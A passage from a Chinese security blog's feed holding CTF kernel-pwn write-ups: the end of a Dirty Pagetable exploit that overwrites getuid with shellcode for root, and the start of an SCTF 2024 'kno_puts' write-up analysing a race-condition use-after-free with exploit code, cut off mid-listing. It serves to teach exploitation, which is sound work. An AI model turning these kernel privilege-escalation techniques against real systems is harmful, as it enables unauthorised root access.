(dup(read_fd[uaf_read_fd]) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">            err_exit(<span class="string">&quot;dup&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] DMA-BUF now points to PTE: 0x%016lx\n&quot;</span>, *(<span class="type">size_t</span>*)dmabuf);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Leak kernel physical base</span></span><br><span class="line">    <span class="type">void</span> *wwwbuf = <span class="literal">NULL</span>;</span><br><span class="line">    *(<span class="type">size_t</span>*)dmabuf = <span class="number">0x800000000009c067</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; N_PAGESPRAY; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (page_spray[i] == evil) <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">if</span> (*(<span class="type">size_t</span>*)page_spray[i] &gt; <span class="number">0xffff</span>) &#123;</span><br><span class="line">            wwwbuf = page_spray[i];</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+] Found victim page table: %p\n&quot;</span>, wwwbuf);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] wwwbuf data: %p \n&quot;</span>, ((*(<span class="type">size_t</span>*)wwwbuf)));</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> phys_base = ((*(<span class="type">size_t</span>*)wwwbuf) &amp; ~<span class="number">0xfff</span>) - <span class="number">0x3a01000</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Physical kernel base address: 0x%016lx\n&quot;</span>, phys_base);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Overwrite setxattr</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] Overwriting getuid...&quot;</span>);</span><br><span class="line">    <span class="comment">// ffffffff811ab7e0 t __do_sys_getuid</span></span><br><span class="line">    <span class="type">size_t</span> phys_func = phys_base + <span class="number">0x1ab7e0</span> - <span class="number">0x3000</span>;</span><br><span class="line">    *(<span class="type">size_t</span>*)dmabuf = (phys_func &amp; ~<span class="number">0xfff</span>) | <span class="number">0x8000000000000067</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span> *p;</span><br><span class="line">    p = memmem(shellcode, <span class="keyword">sizeof</span>(shellcode), <span class="string">&quot;\x11\x11\x11\x11\x11\x11\x11\x11&quot;</span>, <span class="number">8</span>);</span><br><span class="line">    *(<span class="type">size_t</span>*)p = getpid();</span><br><span class="line">    p = memmem(shellcode, <span class="keyword">sizeof</span>(shellcode), <span class="string">&quot;\x22\x22\x22\x22\x22\x22\x22\x22&quot;</span>, <span class="number">8</span>);</span><br><span class="line">    *(<span class="type">size_t</span>*)p = (<span class="type">size_t</span>)&amp;win;</span><br><span class="line">    p = memmem(shellcode, <span class="keyword">sizeof</span>(shellcode), <span class="string">&quot;\x33\x33\x33\x33\x33\x33\x33\x33&quot;</span>, <span class="number">8</span>);</span><br><span class="line">    *(<span class="type">size_t</span>*)p = user_cs;</span><br><span class="line">    p = memmem(shellcode, <span class="keyword">sizeof</span>(shellcode), <span class="string">&quot;\x44\x44\x44\x44\x44\x44\x44\x44&quot;</span>, <span class="number">8</span>);</span><br><span class="line">    *(<span class="type">size_t</span>*)p = user_rflags;</span><br><span class="line">    p = memmem(shellcode, <span class="keyword">sizeof</span>(shellcode), <span class="string">&quot;\x55\x55\x55\x55\x55\x55\x55\x55&quot;</span>, <span class="number">8</span>);</span><br><span class="line">    *(<span class="type">size_t</span>*)p = user_sp;</span><br><span class="line">    p = memmem(shellcode, <span class="keyword">sizeof</span>(shellcode), <span class="string">&quot;\x66\x66\x66\x66\x66\x66\x66\x66&quot;</span>, <span class="number">8</span>);</span><br><span class="line">    *(<span class="type">size_t</span>*)p = user_ss;</span><br><span class="line">    <span class="built_in">memcpy</span>(wwwbuf + (phys_func &amp; <span class="number">0xfff</span>), shellcode, <span class="keyword">sizeof</span>(shellcode));</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] GO!GO!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="type">uid_t</span> uid = getuid();</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[-] Failed...&quot;</span>);</span><br><span class="line">    close(fd);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] EXP END.&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当时打远程时的效果😋：</p><img src="/2024/11/12/fileuaf/15.png" class="" title="我的图图呢">  <h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>呜呜呜，二进制真的太好玩了，可是能给我玩的时间不多了&#x2F;(ㄒoㄒ)&#x2F;~~</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://mp.weixin.qq.com/s?__biz=Mzg2MzU3Mjc3Ng==&mid=2247488477&idx=1&sn=f8531b3220ea3a9ca2a0fdc2fd9dabc6&chksm=ce77d59af9005c8c2ef35c7e45f45cbfc527bfc4b99bbd02dbaaa964d174a4009897dd329a4d&scene=178&cur_album_id=2559805446807928833#rd">一步一图带你构建 Linux 页表体系 —— 详解虚拟内存如何与物理内存进行映射 (qq.com)</a></p><p><a href="https://ptr-yudai.hatenablog.com/entry/2023/12/08/093606">Understanding Dirty Pagetable - m0leCon Finals 2023 CTF Writeup - CTFするぞ (hatenablog.com)</a></p><p><a href="https://yanglingxi1993.github.io/dirty_pagetable/dirty_pagetable.html">Dirty_Pagetable (yanglingxi1993.github.io)</a></p><p><a href="https://syst3mfailure.io/corjail/">[corCTF 2022] CoRJail: From Null Byte Overflow To Docker Escape Exploiting poll_list Objects In The Linux Kernel (syst3mfailure.io)</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>一题多解 SCTF 2024 kno_puts revenge</title>
      <link href="/2024/10/07/kno_puts/"/>
      <url>/2024/10/07/kno_puts/</url>
      
        <content type="html"><![CDATA[<h2 id="Begin"><a href="#Begin" class="headerlink" title="Begin"></a>Begin</h2><p>又有 kernel 啦  </p><img src="/2024/10/07/kno_puts/1.png" class="" title="我的图图呢">  <p>好久没看 <code>kernel</code> 了，刚好 <code>SCTF</code> 上就来了一道简单题。结果由于生疏了打的巨慢，连血都没拿到😭（4血）上图为比赛时打通的截图。</p><p>由于题目比较简单，所以我打算用多种打法来解决这道题目，同时也当作是对 <code>kernel</code> 的康复训练。这篇文章只是对题目进行各种攻击手段的分析，不会对每个内核结构体的结构以及攻击手法的具体原理进行详细的讲解。本篇文章我会逐步增加题目的限制，然后从低级到高级用不同的攻击手段对题目进行求解。</p><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><h3 id="关键代码："><a href="#关键代码：" class="headerlink" title="关键代码："></a>关键代码：</h3><h4 id="ioctl"><a href="#ioctl" class="headerlink" title="ioctl"></a>ioctl</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">my_module_ioctl</span><span class="params">(__int64 a1, <span class="type">int</span> a2, __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *v5; <span class="comment">// [rsp+30h] [rbp-E0h]</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+60h] [rbp-B0h]</span></span><br><span class="line">  <span class="type">char</span> s1[<span class="number">8</span>]; <span class="comment">// [rsp+94h] [rbp-7Ch] BYREF</span></span><br><span class="line">  __int64 v8; <span class="comment">// [rsp+9Ch] [rbp-74h]</span></span><br><span class="line">  __int64 v9; <span class="comment">// [rsp+A4h] [rbp-6Ch]</span></span><br><span class="line">  __int64 v10; <span class="comment">// [rsp+ACh] [rbp-64h]</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// [rsp+B4h] [rbp-5Ch]</span></span><br><span class="line">  _QWORD v12[<span class="number">4</span>]; <span class="comment">// [rsp+B8h] [rbp-58h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v13; <span class="comment">// [rsp+D8h] [rbp-38h]</span></span><br><span class="line">  __int64 v14; <span class="comment">// [rsp+E0h] [rbp-30h]</span></span><br><span class="line">  <span class="type">char</span> s2[<span class="number">32</span>]; <span class="comment">// [rsp+E8h] [rbp-28h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v16; <span class="comment">// [rsp+108h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v16 = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  *(_QWORD *)s1 = <span class="number">0LL</span>;</span><br><span class="line">  v8 = <span class="number">0LL</span>;</span><br><span class="line">  v9 = <span class="number">0LL</span>;</span><br><span class="line">  v10 = <span class="number">0LL</span>;</span><br><span class="line">  v11 = <span class="number">0</span>;</span><br><span class="line">  get_random_bytes(s2, <span class="number">32LL</span>);</span><br><span class="line">  check_object_size(v12, <span class="number">48LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( copy_from_user(v12, a3, <span class="number">48LL</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-14LL</span>;</span><br><span class="line">  printk(&amp;unk_837);</span><br><span class="line">  *(_QWORD *)s1 = v12[<span class="number">0</span>];</span><br><span class="line">  v8 = v12[<span class="number">1</span>];</span><br><span class="line">  v9 = v12[<span class="number">2</span>];</span><br><span class="line">  v10 = v12[<span class="number">3</span>];</span><br><span class="line">  LOBYTE(v11) = v13;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(s1, s2, <span class="number">0x20</span>uLL) )</span><br><span class="line">    v11 = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v11 != <span class="number">1</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-13LL</span>;</span><br><span class="line">  printk(&amp;unk_84D);</span><br><span class="line">  <span class="keyword">if</span> ( a2 == <span class="number">0xFFF0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !v14 || ptr )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">    ptr = (<span class="type">void</span> *)_kmalloc(<span class="number">736LL</span>, <span class="number">3264LL</span>);</span><br><span class="line">    <span class="built_in">memset</span>(ptr, <span class="number">0</span>, <span class="number">0x2E0</span>uLL);</span><br><span class="line">    printk(&amp;unk_768);</span><br><span class="line">    v6 = v14;</span><br><span class="line">    check_object_size(&amp;ptr, <span class="number">8LL</span>, <span class="number">1LL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( copy_to_user(v6, &amp;ptr, <span class="number">8LL</span>) )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( a2 == <span class="number">0xFFF1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v14 )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">    v5 = ptr;</span><br><span class="line">    <span class="keyword">if</span> ( ptr )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( fchoice )</span><br><span class="line">      &#123;</span><br><span class="line">        ptr = <span class="number">0LL</span>;</span><br><span class="line">        kfree(v5);</span><br><span class="line">        fchoice = <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="write"><a href="#write" class="headerlink" title="write"></a>write</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">module_write</span><span class="params">(__int64 a1, __int64 a2, <span class="type">unsigned</span> __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *v5; <span class="comment">// [rsp+30h] [rbp-28h]</span></span><br><span class="line"></span><br><span class="line">  printk(&amp;unk_820);</span><br><span class="line">  <span class="keyword">if</span> ( a3 &gt; <span class="number">0x2E0</span> || !ptr )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">  v5 = ptr;</span><br><span class="line">  check_object_size(ptr, a3, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">int</span>)copy_from_user(v5, a2, a3);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="随机数绕过"><a href="#随机数绕过" class="headerlink" title="随机数绕过"></a>随机数绕过</h3><p>可以看到题目会先生成一个 <code>32</code> 位的随机数然后和我们自己的字符串进行比较，要比较通过才可以进行后面的操作。这里听说有挺多种绕过方法，但由于这不是重点，所以这里我只用我自己的方法。我们可以赌随机数的第一位是 <code>\x00</code>，这个时候比较就会只比较第一位 <code>\x00</code>，写个循环爆破即可，我的 <code>add</code> 和 <code>del</code> 函数如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> v14[<span class="number">0x100</span>];</span><br><span class="line"><span class="type">void</span> <span class="title function_">add</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Begin add.&quot;</span>);</span><br><span class="line">    vuln.e = (<span class="type">size_t</span>)v14;</span><br><span class="line">    <span class="keyword">for</span>(;;)&#123;</span><br><span class="line">        <span class="type">int</span> result = ioctl(fd, <span class="number">0xFFF0</span>, &amp;vuln);</span><br><span class="line">        <span class="keyword">if</span>(result != <span class="number">-1</span>)&#123;</span><br><span class="line">            info(<span class="string">&quot;Add success.&quot;</span>);</span><br><span class="line">            heap_addr = *(<span class="type">size_t</span>*)vuln.e;</span><br><span class="line">            hexx(<span class="string">&quot;heap_addr&quot;</span>, heap_addr);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">del</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Begin delete&quot;</span>);</span><br><span class="line">    vuln.e = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(;;)&#123;</span><br><span class="line">        <span class="type">int</span> result = ioctl(fd, <span class="number">0xFFF1</span>, &amp;vuln);</span><br><span class="line">        <span class="keyword">if</span>(result != <span class="number">-1</span>)&#123;</span><br><span class="line">            info(<span class="string">&quot;Delete success.&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>可以发现这个内核驱动并没有上锁，所以我们可以利用条件竞争来创造出 <code>UAF</code>，即在 <code>write</code> 函数执行 <code>copy_from_user</code> 前调用 <code>kfree</code> 讲堆块释放掉，这个时候就会出现 <code>UAF</code></p><p>在进行堆块创建的时候，可以看见有一个 copy_to_user 函数被调用，我们可以利用这个来泄露出堆地址</p><h2 id="notes-leak-userfaultfd-tty-struct-rt-regs"><a href="#notes-leak-userfaultfd-tty-struct-rt-regs" class="headerlink" title="notes leak + userfaultfd + tty_struct + rt_regs"></a>notes leak + userfaultfd + tty_struct + rt_regs</h2><h3 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h3><p>这是笔者我比赛时所使用的解法，同时也应该是最好想、最直接、最预期（我猜的）的解法。从一个内核初学者的角度来想，做 <code>kernel pwn</code> 肯定要先泄露内核地址，往往这并不简单，但这题的内核基址是白给的！！！具体原理可以参考我半年前的博客<a href="https://qanux.github.io/2024/04/17/notes/">When ELF notes reveal too much | Qanux’s space</a></p><img src="/2024/10/07/kno_puts/2.png" class="" title="我的图图呢">  <p>简单的来说，我们可以直接从 <code>/sys/kernel/notes</code> 中直接获取内核的地址。其次是堆地址，堆地址的获取方法已经写在题目分析部分了，这里不再进行讲述。</p><p>接下来我们关注到的是他的 <code>add</code> 操作是通过 <code>kmalloc</code> 申请了 <code>736</code> 字节的内存，这个大小刚好是 <code>tty_struct</code> 结构体的大小，这不是摆明着要我们通过劫持 <code>tty_struct</code> 的 <code>ops</code> 来实现程序流的控制？我们先来查看内核的版本</p><img src="/2024/10/07/kno_puts/3.png" class="" title="我的图图呢">  <p>可以发现内核的版本比较低，我们可以通过 <code>userfaultfd</code> 来将程序卡在 <code>copy_from_user</code>。接下来我们的目标就是在内核的某个位置写上 <code>kernel rop</code> 然后通过劫持 <code>tty_struct</code> 栈迁移到我们的 <code>kernel rop</code> 上去。其实这里可以直接将 <code>kernel rop</code> 写道 <code>tty_struct</code> 上然后进行两次栈迁移跳转到我们的 <code>rop</code> 上，可是我懒，完全没考虑要这么做😇</p><p>然后我幸运的发现，这个内核的 <code>pt_regs</code> 并没有开启随机化，也就是说当内核执行 <code>tty_struct</code> 虚表上的函数时该结构与 <code>rsp</code> 的距离不会变，所以我们可以直接将 <code>kernel rop</code> 布局到这个位置然后伪造 <code>tty_struct ops</code> 直接栈迁移到我们布局好的 <code>kernel rop</code> 上实现提权</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p>由于比赛时比较紧张（想拿血），而且遇到了很多意外心态有点小崩，所以 <code>exp</code> 写的有点难看，可是不想改了 :-)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// musl-gcc exp.c --static -masm=intel -lpthread -idirafter /usr/include/ -idirafter /usr/include/x86_64-linux-gnu/ -o exp</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/shm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span 